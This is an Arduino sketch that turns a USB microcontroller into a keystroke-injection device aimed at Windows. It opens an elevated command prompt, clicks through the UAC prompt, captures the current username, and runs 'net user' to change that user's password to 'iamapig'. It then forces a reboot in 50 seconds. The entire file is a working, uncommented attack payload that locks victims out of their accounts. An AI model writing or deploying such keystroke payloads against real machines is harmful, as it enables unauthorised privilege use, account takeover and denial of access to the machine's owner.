#include "Keyboard.h"


void setup() { 

  Keyboard.begin();
  delay(10000);
  Keyboard.press(KEY_LEFT_GUI);  
  Keyboard.press('r');        
  Keyboard.releaseAll();
  delay(500); 
  Keyboard.print("cmd");
  delay(500); 
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press(KEY_LEFT_SHIFT);
  Keyboard.press(KEY_KP_ENTER);
  Keyboard.releaseAll();
  delay(1000); 
  Keyboard.write(KEY_LEFT_ARROW);
  delay(500);
  Keyboard.write(KEY_KP_ENTER);
  delay(800);
  Keyboard.print("echo %username%");
  delay(500);
  Keyboard.write(KEY_KP_ENTER);
  delay(50);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('a');
  Keyboard.releaseAll();
  delay(50);
  Keyboard.write(KEY_KP_ENTER);
  delay(50);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('v');
  Keyboard.releaseAll();
  delay(500);
  Keyboard.write(KEY_KP_ENTER);
  delay(50);
  Keyboard.write(KEY_UP_ARROW);
  delay(50);
  Keyboard.write(KEY_UP_ARROW);
  delay(500);
  Keyboard.print(" iamapig");
  delay(500);
  for(int i = 0; i<=100; i++){
    Keyboard.write(KEY_LEFT_ARROW);
  }
  Keyboard.print("net user ");
  delay(500);
  Keyboard.write(KEY_KP_ENTER);
  delay(50);
  Keyboard.print("shutdown -r -t 50");
  delay(500);
  Keyboard.write(KEY_KP_ENTER);
  Keyboard.end();

}


void loop() {

}

